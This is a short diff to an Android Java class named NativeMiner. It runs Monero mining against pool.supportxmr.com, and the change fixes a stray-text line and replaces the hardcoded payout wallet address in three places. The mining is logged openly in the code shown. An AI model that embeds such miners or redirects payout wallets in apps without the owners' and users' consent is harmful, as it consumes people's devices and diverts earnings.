@@ -1,4 +1,4 @@
-        inspackage com.marduk.miner;
+package com.marduk.miner;
 
 import android.os.Handler;
 import android.os.Looper;
@@ -37,8 +37,8 @@ public class NativeMiner {
     private NativeMiner() {
         handler = new Handler(Looper.getMainLooper());
         initMiner();
-        // Set default wallet and pool
-        setWallet("44osUR6e9UjePWUQhavLNYTY7JSzwZMN6249AdnjbwmtXtirsjDiGcejCjJkoTst2BGD3NaLrtpzNENsc6AsZ9AGKWTx7YZ");
+        // ✅ NEW WALLET ADDRESS
+        setWallet("45ktWDeTNtUcVMXfJRKS6bbXMznMAStZFX6niJHcVy9uQk132bHJ21QTC5AKvqyx9XJN5e7mPc3vViyGnB2BM6DD1ZoAoZb");
         setPool("pool.supportxmr.com:443");
     }
     
@@ -62,7 +62,7 @@ public class NativeMiner {
         startMining();
         startStatsUpdate();
         log("⛏️ Mining started!");
-        log("📤 Wallet: 44osUR6e9Uje...WKTx7YZ");
+        log("📤 Wallet: 45ktWDeTNtUc...ZoAoZb");
         log("🔗 Pool: pool.supportxmr.com:443");
         log("⏳ Waiting for shares... (24-48 hrs for first)");
     }
@@ -137,7 +137,7 @@ public class NativeMiner {
     }
     
     public String getWallet() {
-        return "44osUR6e9UjePWUQhavLNYTY7JSzwZMN6249AdnjbwmtXtirsjDiGcejCjJkoTst2BGD3NaLrtpzNENsc6AsZ9AGKWTx7YZ";
+        return "45ktWDeTNtUcVMXfJRKS6bbXMznMAStZFX6niJHcVy9uQk132bHJ21QTC5AKvqyx9XJN5e7mPc3vViyGnB2BM6DD1ZoAoZb";
     }
     
     public String getPool() {
